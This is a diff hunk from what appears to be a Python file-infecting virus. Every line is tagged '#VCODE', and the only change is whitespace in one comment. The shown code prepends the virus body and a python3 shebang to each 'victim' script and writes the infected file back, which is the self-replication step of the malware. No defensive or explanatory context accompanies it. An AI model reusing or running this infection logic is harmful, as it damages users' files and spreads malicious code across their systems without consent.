@@ -40,6 +40,6 @@ for entry in dirs:                                                      #VCODE
     # Prepend virus script to victim script.                            #VCODE
     infected = "#!/usr/bin/python3\n" + virus + victim                  #VCODE
                                                                         #VCODE
-    # Write infected victim script back.                                       #VCODE
+    # Write infected victim script back.                                #VCODE
     with open(entry, "w") as fp:                                        #VCODE
         fp.write(infected)                                              #VCODE
